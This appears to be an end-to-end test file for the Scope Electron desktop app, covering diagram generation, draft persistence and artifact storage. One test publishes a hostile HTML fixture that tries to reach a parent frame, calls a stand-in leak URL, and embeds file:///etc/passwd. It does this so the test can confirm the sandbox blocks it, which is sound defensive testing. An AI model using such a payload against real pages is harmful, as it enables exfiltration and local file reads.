import { expect, test } from "vite-plus/test";
import { rm, readFile, stat } from "node:fs/promises";
import { join } from "node:path";
import { DatabaseSync } from "node:sqlite";
import { desktopFixture } from "./desktop-fixture.ts";

test("the CLI commits artifacts while diagram generation is pending and the renderer is paused", async () => {
  const { directory, launch, connect, cli } = await desktopFixture();
  const application = await launch();
  try {
    await application.evaluate(() => {
      const original = globalThis.fetch;
      globalThis.fetch = async (url, init) => {
        if (url !== "https://openrouter.ai/api/v1/chat/completions") return original(url, init);
        return new Promise<Response>((_resolve, reject) => {
          init?.signal?.addEventListener("abort", () => reject(new Error("Canceled")), {
            once: true,
          });
        });
      };
    });
    const page = await application.firstWindow();
    await page.getByRole("button", { name: "Search and controls" }).click();
    await page.getByRole("button", { name: "Settings", exact: true }).click();
    await page.getByRole("button", { name: "Diagram generation", exact: true }).click();
    await page.getByLabel("OpenRouter API key").fill("synthetic-pending-key");
    await page.getByRole("button", { name: "Save key" }).click();
    await page.getByText("Settings saved.").waitFor();
    await page.getByRole("button", { name: "Done", exact: true }).click();
    await expect.poll(() => page.getByRole("dialog").count()).toBe(0);
    await page.getByRole("button", { name: "Create diagram", exact: true }).click();
    await page.getByLabel("What should the diagram show?").fill("A request that stays pending.");
    await page.getByRole("button", { name: "Create diagram", exact: true }).click();
    await page.getByRole("button", { name: "Cancel", exact: true }).waitFor();

    const debuggerSession = await page.context().newCDPSession(page);
    await debuggerSession.send("Debugger.enable");
    await debuggerSession.send("Debugger.pause");
    try {
      const receipt = await cli("text", "Published during rendering", "--id", "independent");
      expect(JSON.parse(receipt.stdout)).toMatchObject({ id: "independent", revision: 1 });
      const client = await connect();
      expect(new TextDecoder().decode(await client.content("independent"))).toBe(
        "Published during rendering",
      );
    } finally {
      await debuggerSession.send("Debugger.resume");
      await debuggerSession.detach();
    }
    await page.getByRole("button", { name: "Cancel", exact: true }).click();
    await page.getByRole("button", { name: "Done", exact: true }).click();
    await page.getByText("Published during rendering", { exact: true }).waitFor();
  } finally {
    await application.close();
    await rm(directory, { recursive: true, force: true });
  }
}, 60_000);

test("the diagram tool creates an editable Excalidraw artifact in desktop storage", async () => {
  const { directory, settingsDirectory, launch, connect } = await desktopFixture();
  let application = await launch();
  let client = await connect();
  try {
    const result = await readFile(
      new URL("./fixtures/diagram-response.json", import.meta.url),
      "utf8",
    );
    await application.evaluate((_electron, output) => {
      const original = globalThis.fetch;
      globalThis.fetch = async (url, init) =>
        url === "https://openrouter.ai/api/v1/chat/completions"
          ? Response.json({
              choices: [{ message: { content: output }, finish_reason: "stop" }],
              usage: { prompt_tokens: 80, completion_tokens: 40, cost: 0.001 },
            })
          : original(url, init);
    }, result);
    let page = await application.firstWindow();
    const errors: string[] = [];
    page.on("pageerror", (error) => errors.push(error.message));
    await page.getByRole("button", { name: "Search and controls" }).click();
    await page.getByRole("button", { name: "Settings", exact: true }).click();
    await page.getByRole("button", { name: "Diagram generation", exact: true }).click();
    await page.getByLabel("OpenRouter API key").fill("synthetic-diagram-key");
    await page.getByRole("button", { name: "Save key" }).click();
    await page.getByText("Settings saved.").waitFor();
    await page.getByRole("button", { name: "Appearance", exact: true }).click();
    await page.getByLabel("Appearance", { exact: true }).selectOption("dark");
    await expect.poll(() => page.locator("html").getAttribute("data-theme")).toBe("dark");
    await page.getByRole("button", { name: "Done", exact: true }).click();
    await expect
      .poll(() => page.locator('[data-slot="dialog-content"]').count(), { timeout: 5000 })
      .toBe(0);
    await page.getByRole("button", { name: "Create diagram", exact: true }).click();
    await page.getByLabel("What should the diagram show?").fill("A browser talks to an API.");
    await page.getByRole("button", { name: "Create diagram", exact: true }).click();
    await page.getByRole("button", { name: "Ask agent", exact: true }).click();
    await page.getByLabel("Change diagram", { exact: true }).waitFor();
    await page.locator(".excalidraw canvas").first().waitFor();
    await page.locator(".excalidraw.theme--dark").waitFor();
    const artifacts = await client.list();
    expect(artifacts).toHaveLength(1);
    expect(artifacts[0].kind).toBe("excalidraw");
    const saved = JSON.parse(new TextDecoder().decode(await client.content(artifacts[0].id)));
    expect(saved.type).toBe("excalidraw");
    expect(
      saved.elements.filter((element: { type: string }) => element.type === "rectangle"),
    ).toHaveLength(2);
    expect(
      saved.elements.filter((element: { type: string }) => element.type === "arrow"),
    ).toHaveLength(1);
    await application.evaluate(() => {
      const original = globalThis.fetch;
      globalThis.fetch = async (url, init) =>
        url === "https://openrouter.ai/api/v1/chat/completions"
          ? Response.json({
              choices: [
                {
                  message: {
                    content: JSON.stringify({
                      message: "Moved the API.",
                      operations: [{ type: "move", id: "api", x: 540, y: 180 }],
                    }),
                  },
                  finish_reason: "stop",
                },
              ],
            })
          : original(url, init);
    });
    await page.getByLabel("Change diagram", { exact: true }).fill("Move the API right.");
    await page.getByRole("button", { name: "Send", exact: true }).click();
    await page.getByText("Moved the API.", { exact: true }).waitFor();
    await page.getByLabel("Change diagram", { exact: true }).fill("Keep this draft");
    await page.getByRole("button", { name: "Close diagram chat" }).click();
    expect(await page.getByRole("complementary", { name: "Diagram agent" }).isVisible()).toBe(
      false,
    );
    await page.getByRole("button", { name: "Ask agent", exact: true }).click();
    expect(await page.getByLabel("Change diagram", { exact: true }).inputValue()).toBe(
      "Keep this draft",
    );
    const canvas = await page.locator(".excalidraw canvas").first().elementHandle();
    await page.getByRole("button", { name: "Search and controls" }).click();
    await page.getByRole("button", { name: "Fullscreen", exact: true }).click();
    expect(await page.getByRole("complementary", { name: "Diagram agent" }).isVisible()).toBe(
      false,
    );
    await page.keyboard.press("Escape");
    expect(await page.getByLabel("Change diagram", { exact: true }).inputValue()).toBe(
      "Keep this draft",
    );
    expect(await canvas?.evaluate((element) => element.isConnected)).toBe(true);
    await page.getByRole("button", { name: "Save", exact: true }).click();
    await expect.poll(async () => (await client.get(artifacts[0].id)).revision).toBe(2);
    const updated = JSON.parse(new TextDecoder().decode(await client.content(artifacts[0].id)));
    expect(updated.elements.find((element: { id: string }) => element.id === "agent:api").x).toBe(
      540,
    );
    await application.evaluate(() => {
      const original = globalThis.fetch;
      globalThis.fetch = async (url, init) => {
        if (url !== "https://openrouter.ai/api/v1/chat/completions") return original(url, init);
        return new Promise<Response>((_resolve, reject) => {
          init?.signal?.addEventListener("abort", () => reject(new Error("Canceled")), {
            once: true,
          });
        });
      };
    });
    await page.getByLabel("Change diagram", { exact: true }).fill("A request to cancel");
    await page.getByRole("button", { name: "Send", exact: true }).click();
    await page.getByRole("button", { name: "Cancel", exact: true }).click();
    await page.getByText("Request canceled. The canvas is unchanged.", { exact: true }).waitFor();
    expect((await client.get(artifacts[0].id)).revision).toBe(2);
    expect(await page.getByRole("button", { name: "Save", exact: true }).isEnabled()).toBe(false);
    await application.evaluate(() => {
      const original = globalThis.fetch;
      globalThis.fetch = async (url, init) =>
        url === "https://openrouter.ai/api/v1/chat/completions"
          ? Response.json({
              choices: [
                {
                  message: {
                    content: JSON.stringify({
                      message: "Moved it again.",
                      operations: [{ type: "move", id: "api", x: 620, y: 180 }],
                    }),
                  },
                  finish_reason: "stop",
                },
              ],
            })
          : original(url, init);
    });
    await page.getByLabel("Change diagram", { exact: true }).fill("Move it again");
    await page.getByRole("button", { name: "Send", exact: true }).click();
    await page.getByText("Moved it again.", { exact: true }).waitFor();
    await client.publish(
      artifacts[0].id,
      {
        title: artifacts[0].title,
        kind: "excalidraw",
        mediaType: artifacts[0].mediaType,
        fileName: artifacts[0].fileName,
        expectedRevision: 2,
      },
      new TextEncoder().encode(JSON.stringify(updated)),
    );
    await page.getByText("A newer version arrived. Your edits are still here.").waitFor();
    const database = new DatabaseSync(join(settingsDirectory, "desktop.db"));
    try {
      database.exec(
        "CREATE TRIGGER fail_draft BEFORE INSERT ON diagram_drafts BEGIN SELECT RAISE(ABORT, 'synthetic write failure'); END",
      );
      await page
        .getByLabel("Change diagram", { exact: true })
        .fill("Keep this prompt through a failure");
      await page
        .getByText("Could not save this draft on your Mac. Keep Scope open and retry.")
        .waitFor();
      await page.getByRole("button", { name: `Close ${artifacts[0].title}`, exact: true }).click();
      await page
        .getByText("Could not save this tab. Keep it open and try closing it again.")
        .waitFor();
      expect(await page.getByRole("tab", { name: artifacts[0].title, exact: true }).count()).toBe(
        1,
      );
      database.exec("DROP TRIGGER fail_draft");
      await page.getByRole("button", { name: "Retry", exact: true }).click();
      await page
        .getByText("Could not save this draft on your Mac. Keep Scope open and retry.")
        .waitFor({ state: "hidden" });
    } finally {
      database.close();
    }
    await page.getByRole("button", { name: "Dismiss error" }).click();
    const savedDraft = await page.evaluate((id) => window.scope.diagramDraft(id), artifacts[0].id);
    expect(JSON.parse(savedDraft!.content).elements).toEqual(
      expect.arrayContaining([expect.objectContaining({ id: "agent:api", x: 620 })]),
    );
    await page.getByText("Moved it again.", { exact: true }).waitFor();
    expect(await page.getByLabel("Change diagram", { exact: true }).inputValue()).toBe(
      "Keep this prompt through a failure",
    );
    await page.getByText("A newer version arrived. Your edits are still here.").waitFor();
    expect(await page.getByRole("button", { name: "Save", exact: true }).isEnabled()).toBe(true);
    const previousViewport = (await page.evaluate(
      (id) => window.scope.diagramDraft(id),
      artifacts[0].id,
    ))!.viewport;
    await page.getByRole("button", { name: "Zoom out", exact: true }).click();
    await expect
      .poll(
        async () =>
          (await page.evaluate((id) => window.scope.diagramDraft(id), artifacts[0].id))?.viewport
            .zoom,
      )
      .toBeLessThan(previousViewport.zoom);
    const zoomedViewport = (await page.evaluate(
      (id) => window.scope.diagramDraft(id),
      artifacts[0].id,
    ))!.viewport;
    await page.mouse.move(600, 400);
    await page.mouse.wheel(100, 140);
    await expect
      .poll(
        async () =>
          (await page.evaluate((id) => window.scope.diagramDraft(id), artifacts[0].id))?.viewport,
      )
      .not.toEqual(zoomedViewport);
    const viewport = (await page.evaluate((id) => window.scope.diagramDraft(id), artifacts[0].id))!
      .viewport;
    expect(viewport.zoom).toBeLessThan(previousViewport.zoom);
    // Quit immediately after typing, before the periodic draft write is due.
    await page
      .getByLabel("Change diagram", { exact: true })
      .fill("Keep this last prompt after restart");
    await application.close();
    application = await launch();
    client = await connect();
    page = await application.firstWindow();
    page.on("pageerror", (error) => errors.push(error.message));
    await page.getByText("Moved it again.", { exact: true }).waitFor();
    expect(await page.getByLabel("Change diagram", { exact: true }).inputValue()).toBe(
      "Keep this last prompt after restart",
    );
    await page.getByText("A newer version arrived. Your edits are still here.").waitFor();
    await page.getByLabel("Change diagram", { exact: true }).fill("Continue the restored draft");
    await expect
      .poll(
        async () =>
          (await page.evaluate((id) => window.scope.diagramDraft(id), artifacts[0].id))?.intent,
      )
      .toBe("Continue the restored draft");
    const restored = await page.evaluate((id) => window.scope.diagramDraft(id), artifacts[0].id);
    expect(restored?.dirty).toBe(true);
    expect(JSON.parse(restored!.content).elements).toEqual(
      expect.arrayContaining([expect.objectContaining({ id: "agent:api", x: 620 })]),
    );
    expect(restored?.viewport).toEqual(viewport);
    expect((await client.get(artifacts[0].id)).revision).toBe(3);
    await page.getByRole("button", { name: "Save a copy", exact: true }).click();
    await expect.poll(async () => (await client.list()).length).toBe(2);
    const copy = (await client.list()).find((artifact) => artifact.id !== artifacts[0].id)!;
    const copied = JSON.parse(new TextDecoder().decode(await client.content(copy.id)));
    expect(copied.elements.find((element: { id: string }) => element.id === "agent:api").x).toBe(
      620,
    );
    const remote = JSON.parse(new TextDecoder().decode(await client.content(artifacts[0].id)));
    expect(remote.elements.find((element: { id: string }) => element.id === "agent:api").x).toBe(
      540,
    );
    await page.getByRole("button", { name: "Discard edits and load latest", exact: true }).click();
    await expect
      .poll(() => page.getByRole("button", { name: "Save", exact: true }).isEnabled())
      .toBe(false);
    expect(errors).toEqual([]);
    await page.screenshot({ path: join(directory, "diagram.png") });
  } finally {
    await application.close();
    await rm(directory, { recursive: true, force: true });
  }
}, 60_000);

test("Electron receives and reopens artifacts, isolates hostile HTML, and keeps development keys out of files", async () => {
  const { directory, settingsDirectory, connectionFile, launch, connect, cli } =
    await desktopFixture();
  let application: Awaited<ReturnType<typeof launch>> | undefined;
  try {
    await expect(cli("list")).rejects.toMatchObject({
      code: 1,
      stderr: expect.stringContaining("Open Scope on this Mac"),
    });
    application = await launch();
    const page = await application.firstWindow();
    const client = await connect();
    const failures: string[] = [];
    page.on("pageerror", (error) => failures.push(error.message));
    await page.getByRole("heading", { name: "Things your agents leave for you" }).waitFor();
    await cli(
      "text",
      "# Actual report\nPersist me.",
      "--title",
      "Review",
      "--id",
      "review",
      "--kind",
      "markdown",
    );
    expect((await stat(connectionFile)).mode & 0o777).toBe(0o600);
    await page.getByRole("heading", { name: "Actual report" }).waitFor();
    await page.getByRole("button", { name: "Search and controls" }).click();
    await page.getByRole("button", { name: "Fullscreen", exact: true }).click();
    expect(await page.getByRole("navigation", { name: "Open artifacts" }).count()).toBe(0);
    await page.keyboard.press("Escape");
    expect(await page.getByRole("heading", { name: "Actual report" }).isVisible()).toBe(true);
    await client.publish(
      "hostile",
      {
        title: "Hostile preview",
        kind: "html",
        mediaType: "text/html",
        fileName: "hostile.html",
        expectedRevision: 0,
      },
      new TextEncoder().encode(
        `<h1>Isolated preview</h1><script>document.body.dataset.executed='yes';parent.document.body.dataset.compromised='yes';fetch('https://example.invalid/leak')</script><img src="https://example.invalid/pixel"><iframe src="file:///etc/passwd"></iframe><form action="https://example.invalid/submit"><button>Submit</button></form>`,
      ),
    );
    expect(await page.getByRole("heading", { name: "Actual report" }).isVisible()).toBe(true);
    await page.getByRole("button", { name: "Search and controls" }).click();
    await page.getByLabel("Search artifacts", { exact: true }).fill("Hostile preview");
    await page.getByRole("button", { name: "Hostile preview html" }).click();
    const preview = page.frameLocator('iframe[title="Hostile preview"]');
    await preview.getByRole("heading", { name: "Isolated preview" }).waitFor();
    expect(await preview.locator("body").getAttribute("data-executed")).toBeNull();
    expect(await page.locator("body").getAttribute("data-compromised")).toBeNull();
    const frame = page.frames().find((candidate) => candidate !== page.mainFrame())!;
    expect(
      await frame.evaluate(() => ({
        node: typeof (globalThis as unknown as { require?: unknown }).require,
        scope: typeof (globalThis as unknown as { scope?: unknown }).scope,
      })),
    ).toEqual({ node: "undefined", scope: "undefined" });
    expect(
      await frame.evaluate(() => {
        try {
          return Boolean(parent.document.body);
        } catch {
          return false;
        }
      }),
    ).toBe(false);
    await page.getByRole("button", { name: "Search and controls" }).click();
    await page.getByRole("button", { name: "Settings", exact: true }).click();
    expect(await page.getByText("Hub connection", { exact: true }).count()).toBe(0);
    expect(await page.getByLabel("Hub token").count()).toBe(0);
    await page.getByRole("button", { name: "Diagram generation", exact: true }).click();
    await page.getByLabel("OpenRouter API key").fill("synthetic-desktop-api-key");
    await page.getByRole("button", { name: "Save key" }).click();
    await page.getByText("Settings saved.").waitFor();
    expect(await page.getByLabel("OpenRouter API key").inputValue()).toBe("");
    const database = new DatabaseSync(join(settingsDirectory, "desktop.db"), { readOnly: true });
    try {
      expect(JSON.stringify(database.prepare("SELECT * FROM preferences").all())).not.toContain(
        "synthetic-desktop-api-key",
      );
    } finally {
      database.close();
    }
    expect(await page.evaluate(() => localStorage.getItem("scope.workspace.v1"))).toBeNull();
    await page.getByRole("button", { name: "Remove key" }).click();
    await page.getByText("No key saved").waitFor();
    await page.getByRole("button", { name: "Done", exact: true }).click();
    expect(failures).toEqual([]);
    await application.close();
    application = undefined;
    await expect(cli("text", "Offline publication", "--id", "not-queued")).rejects.toMatchObject({
      code: 1,
      stderr: expect.stringContaining("Cannot reach Scope"),
    });
    expect(
      (await readFile(join(settingsDirectory, "artifacts", "scope.db"))).subarray(0, 15).toString(),
    ).toBe("SQLite format 3");
    application = await launch();
    const restored = await connect();
    expect((await restored.list()).map((artifact) => artifact.id).sort()).toEqual([
      "hostile",
      "review",
    ]);
    expect(JSON.parse((await cli("get", "review")).stdout)).toMatchObject({
      id: "review",
      revision: 1,
    });
    const reopened = await application.firstWindow();
    await reopened
      .frameLocator('iframe[title="Hostile preview"]')
      .getByRole("heading", { name: "Isolated preview" })
      .waitFor();
    expect(await reopened.getByRole("button", { name: "Close Review", exact: true }).count()).toBe(
      1,
    );
  } finally {
    await application?.close();
    await rm(directory, { recursive: true, force: true });
  }
}, 60_000);
